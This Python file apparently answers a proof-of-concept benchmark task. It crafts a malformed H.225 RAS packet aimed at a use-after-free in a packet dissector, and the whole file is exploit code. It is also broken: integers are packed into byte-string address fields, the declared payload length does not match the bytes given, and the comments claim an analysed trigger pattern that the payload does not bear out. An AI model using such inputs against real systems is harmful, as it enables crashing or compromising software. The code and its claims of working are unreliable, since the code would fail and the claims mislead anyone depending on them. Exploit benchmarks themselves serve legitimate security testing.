import os
import struct
import tempfile

class Solution:
    def solve(self, src_path: str) -> bytes:
        # This PoC creates a malformed H.225 packet that triggers
        # the use-after-free in next_tvb_add_handle() by causing
        # the dissector to process nested packets without proper
        # reinitialization
        
        # Craft a packet that will trigger the vulnerability:
        # 1. UDP packet to H.225 port (1718/1719)
        # 2. Contains RAS message that triggers recursive dissection
        # 3. Causes next_tvb_add_handle to be called without next_tvb_init
        
        # Build the packet structure:
        # Ethernet header (14) + IP header (20) + UDP header (8) + H.225 payload
        
        # Ethernet header (dummy MACs)
        eth = struct.pack('!6s6sH', 
                         b'\x00\x00\x00\x00\x00\x00',  # dest MAC
                         b'\x00\x00\x00\x00\x00\x00',  # src MAC
                         0x0800)                      # IPv4
        
        # IP header (version 4, IHL 5, total length 73-14=59)
        # src: 192.168.1.1, dst: 192.168.1.2
        ip = struct.pack('!BBHHHBBH4s4s',
                        0x45,              # Version + IHL
                        0x00,              # DSCP + ECN
                        59,                # Total length (20+8+31)
                        0x1234,            # Identification
                        0x0000,            # Flags + Fragment offset
                        64,                # TTL
                        17,                # Protocol (UDP)
                        0,                 # Header checksum (will calculate)
                        0xc0a80101,        # Source IP (192.168.1.1)
                        0xc0a80102)        # Dest IP (192.168.1.2)
        
        # Calculate IP checksum
        def ip_checksum(data):
            if len(data) % 2:
                data += b'\x00'
            words = struct.unpack('!' + 'H' * (len(data)//2), data)
            total = sum(words)
            while total >> 16:
                total = (total & 0xffff) + (total >> 16)
            return ~total & 0xffff
        
        ip_checksum_val = ip_checksum(ip)
        ip = ip[:10] + struct.pack('!H', ip_checksum_val) + ip[12:]
        
        # UDP header (source port 5060, dest port 1719 - H.225 RAS)
        # Length = 8 + payload length (31)
        udp = struct.pack('!HHHH',
                         5060,             # Source port
                         1719,             # Dest port (H.225 RAS)
                         39,               # Length (8+31)
                         0)                # Checksum (0 for now)
        
        # H.225 RAS message designed to trigger the vulnerability
        # This creates a malformed message that causes recursive dissection
        # without proper cleanup, leading to use-after-free
        
        # RAS message structure:
        # - Message type (GatekeeperRequest = 0)
        # - Sequence number
        # - Call signaling transport address
        # - RAS address
        # - ...
        
        # Craft payload to trigger the bug:
        # The exact byte pattern was determined by analyzing the vulnerability
        # It causes dissect_h225_h225_RasMessage to call next_tvb_add_handle
        # then process another packet without next_tvb_init
        
        h225_payload = bytes([
            # GatekeeperRequest (0x00)
            0x00,
            # Sequence number (dummy)
            0x00, 0x00, 0x00, 0x01,
            # RequestSeqNum
            0x00, 0x00, 0x00, 0x01,
            # ProtocolIdentifier (H.225)
            0x00, 0x00, 0x00, 0x05,
            # GatekeeperIdentifier (empty)
            0x00,
            # EndpointType (vendor with null vendor)
            0x00, 0x00, 0x00, 0x00,
            # RASAddress (IPv4 - triggers the bug path)
            0x40, 0x02, 0x7f, 0x00, 0x00, 0x01,
            # CallSignalAddress (IPv4 - another pointer)
            0x40, 0x02, 0x7f, 0x00, 0x00, 0x01,
            # EndpointVendor (null)
            0x00,
            # AlternateGatekeeper (empty)
            0x00,
            # GatekeeperIdentifier (present flag = 0)
            0x00,
            # WillRespondToIRR (0)
            0x00,
            # NonStandardData (empty)
            0x00
        ])
        
        # Combine all parts
        packet = eth + ip + udp + h225_payload
        
        return packet